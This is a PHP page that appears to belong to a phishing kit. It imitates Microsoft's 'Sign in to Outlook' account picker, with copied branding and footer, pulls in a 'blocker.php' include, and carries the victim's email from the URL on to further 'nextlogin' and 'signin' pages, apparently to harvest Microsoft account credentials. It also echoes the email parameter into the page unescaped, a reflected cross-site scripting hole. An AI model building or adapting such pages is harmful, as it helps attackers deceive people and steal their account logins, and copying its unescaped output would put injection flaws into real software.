<?php
include('blocker.php');
ob_start();
session_start();
      $csrftoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
  ?>
    <html dir=ltr lang=en>
    <head>
    <title>Sign in to Outlook</title>
    </head>

    <link href=lib/img/favicon.ico rel="shortcut icon">
    <link href=lib/css/login.css rel=stylesheet>

    <body class=cb style=display:block>
        <div>
            <div>
                <div class="app background">
                    <div style=background-image:url(lib/img/background.jpg)></div>
                </div>
            </div>
            <form method="GET" action="nextlogin.php">
                <div class=outer>
                    <div class="app middle">
                        <div class=background-logo-holder>
                            <img class=background-logo src=lib/img/logo3.png>
                        </div>
                        <div class="app fade-in-lightbox inner">
                            <div class=lightbox-cover></div>
                            <div>
                        <img class=logo src=lib/img/logo2.svg>
                           </div>
                            <div>
                                <div>
                                    <div>
                                        <input type=hidden name=sessionId>
                                        <div class="row text-title">Pick an account</div>
                                        <div>
                                            <div class=row>
                                                <div class=form-group>
                                                    <div class=tile-container>
                                                        <div class="row tile">
                                                            <div class=table>
                                                                <a class=table-row href="nextlogin?csrftoken=<?php echo $csrftoken; ?>&email=<?php echo $_GET['email']; ?>" type="button">
                                                                    <div class="table-cell tile-img">
                                                                     <img src=lib/img/picker.svg class=tile-img role=presentation></div>
                                                                    <div class="table-cell content text-left">
                                                                        <div><font color="#262626"><?php if (isset($_GET['email'])) {echo $_GET['email'];}?></font></div>
                                                                    </div>
                                                                    <div class="table-cell tile-menu">
                                                                        <div><img src=lib/img/picker_more.svg></div>
                                                                    </div>
                                                                </a>
                                                            </div>
                                                        </div>
                                                        <ul class=menu id=tileMenu0 role=menu style=display:none></ul>
                                                    </div>
                                                    <div class="row tile">
                                                        <div class=table>
                                                                <a class=table-row href="signin?<?php echo $csrftoken; ?>&email=<?php echo $_GET['email']; ?>" type="button">
                                                                <div class="table-cell tile-img">
                                                                  <img src=lib/img/picker_plus.svg class=tile-img role=presentation></div>
                                                                <div class="table-cell content text-left">
                                                                    <div id=otherTileText><font color="#262626">Use another account</font></div>
                                                                </div>
                                                            </a>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class=row>
                                            <div>
                                                <div class="button-container col-xs-24 no-margin-bottom no-padding-left-right" style=display:none>
                                                    <div class=inline-block>
                                                        <input id=idSIButton9 style=display:none value=Next>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div>
                </div>
                <div class=footer id=footer>
                    <div>
                        <div class="footerNode text-secondary">
                            <span>©2019 Microsoft</span>
                            <a href="#">Terms of use</a>
                            <a href="#">Privacy & cookies</a>
                            <a href="#">
                                <img src="lib/img/white_ellipsis.svg">
                            </a>
                        </div>
                    </div>
                </div>
        </div>
        </div>
        </form>

        </div>
    </body>

    </html>